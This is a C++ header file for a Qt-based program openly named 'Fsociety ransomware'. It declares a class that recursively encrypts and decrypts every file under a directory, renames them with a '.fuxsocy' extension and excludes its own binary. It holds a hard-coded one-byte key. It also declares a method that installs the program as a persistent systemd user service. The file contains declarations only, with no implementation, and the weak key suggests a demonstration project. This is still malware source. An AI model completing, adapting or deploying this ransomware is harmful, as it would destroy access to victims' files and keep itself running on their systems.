#ifndef FSOCIETY_RANSOMWARE_FSOCIETY_H
#define FSOCIETY_RANSOMWARE_FSOCIETY_H

#include "config.h"
#include <string>
#include <vector>
#include <QString>
#include <QStringList>

class Fsociety {
private:
	const QString extension = ".fuxsocy";
	QStringList extensionExclusions = {extension};
	QString binName;
	const char key = 31;

	/**
	 * @return true if the given filepath should be excluded
	 */
	bool shouldExclude(const QString& filepath);

	/**
	 * Process the file by reading all its bytes and applying operations to either decrypt or encrypt it
	 * @param filepath path of the file to be encrypted
	 * @param encrypt  if true, file will be encrypted
	 */
	void processFile(const QString& filepath, bool encrypt) const;
public:
	/**
	 * Set the extension exclusions
	 * @param newExtExclusions
	 */
	void setExtExclusions(const QStringList& newExtExclusions);

	/**
	 * Encrypt all files inside the given directory (and subdirectories)
	 * @param dir directory
	 * @return total count of files encrypted
	 */
	size_t encryptFiles(const QString& dir);

	/**
	 * Decrypt all files inside the given directory (and subdirectories)
	 * @param dir directory
	 * @return total count of files decrypted
	 */
	size_t decryptFiles(const QString& dir);

	/**
	 * Set the name of the binary file (this binary file)
	 *
	 * @param name name
	 */
	void setBinName(const QString& name);

	/**
	 * Installs this ransomware as a system service
	 *
	 * On systemd systems, a .service file inside $XDG_CONFIG_HOME/systemd/user or $HOME/.config/systemd/user
	 * is added
	 *
	 * On windows... TODO
	 *
	 * Important: setBinName() should be called before this method
	 */
	void install();
};

#endif //FSOCIETY_RANSOMWARE_FSOCIETY_H
